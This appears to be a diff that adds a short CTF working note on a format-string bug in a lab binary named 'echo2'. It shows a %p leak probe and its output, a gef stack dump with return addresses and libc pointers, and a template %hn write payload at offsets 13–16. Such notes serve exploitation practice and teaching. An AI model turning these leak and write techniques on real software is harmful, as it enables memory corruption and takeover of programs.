@@ -1,0 +1,51 @@
+printf 遇到/'00时停止
+
+root1@ubuntu:~/Desktop/CTF/echo2$ ./echo2
+AAAAAAAA%p%p%p%p%p%p%p%p
+AAAAAAAA
+0x7f8d13201963
+0x7f8d13203790
+0x7f8d12f34260
+0x7f8d13203780
+0x7f8d13414700
+0x4141414141414141
+0x7025702570257025
+0x7025702570257025
+
+
+gef➤  file echo2
+Reading symbols from echo2...(no debugging symbols found)...done.
+gef➤  b printf
+Breakpoint 1 at 0x7a0
+gef➤  r
+Starting program: /home/root1/Desktop/CTF/echo2/echo2 
+aaaa
+gef➤  x/50a 0x00007fffffffdd48
+0x7fffffffdd48:	0x555555554989 <echo+73>	0xa61616161
+0x7fffffffdd58:	0x0							0xff000000
+0x7fffffffdd68:	0xff000000000000			0x0
+0x7fffffffdd78:	0x0							0x0
+0x7fffffffdd88:	0x0							0x0
+0x7fffffffdd98:	0x0							0x0
+0x7fffffffdda8:	0x0							0x0
+0x7fffffffddb8:	0x0							0x2f2f2f2f2f2f2f2f
+0x7fffffffddc8:	0x2f2f2f2f2f2f2f2f			0x0
+0x7fffffffddd8:	0x0							0x0
+0x7fffffffdde8:	0x0							0x0
+0x7fffffffddf8:	0x0							0x7ffff7dd18e0 <_IO_2_1_stdin_>
+0x7fffffffde08:	0x0							0x7ffff7dd2620 <_IO_2_1_stdout_>
+0x7fffffffde18:	0x7ffff7a88947 <_IO_default_setbuf+23>	0x7ffff7dd2620 <_IO_2_1_stdout_>
+0x7fffffffde28:	0x7ffff7fdf700				0x555555554810 <_start>
+0x7fffffffde38:	0x7ffff7a85439 <_IO_new_file_setbuf+9>	0x7ffff7dd2620 <_IO_2_1_stdout_>
+0x7fffffffde48:	0x7ffff7a7cfb4 <__GI__IO_setvbuf+324>	0x0
+0x7fffffffde58:	0x987892a16e90aa00			0x7fffffffde70
+0x7fffffffde68:	0x555555554a03 <main+74>	0x555555554a10 <__libc_csu_init>
+0x7fffffffde78:	0x7ffff7a2d830 <__libc_start_main+240>	0x0
+0x7fffffffde88:	0x7fffffffdf58				0x100000000
+0x7fffffffde98:	0x5555555549b9 <main>		0x0
+0x7fffffffdea8:	0x395c1d50d6414f61			0x555555554810 <_start>
+0x7fffffffdeb8:	0x7fffffffdf50				0x0
+0x7fffffffdec8:	0x0							0x6c094805ff614f61
+
+
+%000000c%13$hn %000000c%14$hn %000000c%15$hn %000000c%16$hn
